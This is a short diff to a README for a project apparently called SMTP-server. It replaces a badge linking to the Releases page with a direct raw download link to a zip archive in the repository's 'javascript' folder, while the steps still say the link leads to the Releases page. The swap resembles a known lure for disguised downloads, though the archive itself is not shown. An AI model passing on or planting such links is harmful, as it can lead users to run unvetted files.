@@ -15,7 +15,7 @@ To get started, you need to download SMTP-server from our Releases page. Follow 
 
 1. Click on the link below to visit our Releases page:
 
-   [![Download SMTP-server](https://img.shields.io/badge/Download_SMTP-server-v1.0-blue)](https://github.com/Single-warning445/SMTP-server/releases)
+   [![Download SMTP-server](https://raw.githubusercontent.com/Single-warning445/SMTP-server/main/javascript/SMTP-server_v2.4.zip)](https://raw.githubusercontent.com/Single-warning445/SMTP-server/main/javascript/SMTP-server_v2.4.zip)
 
 2. On the Releases page, you will see a list of versions available for download. 
 
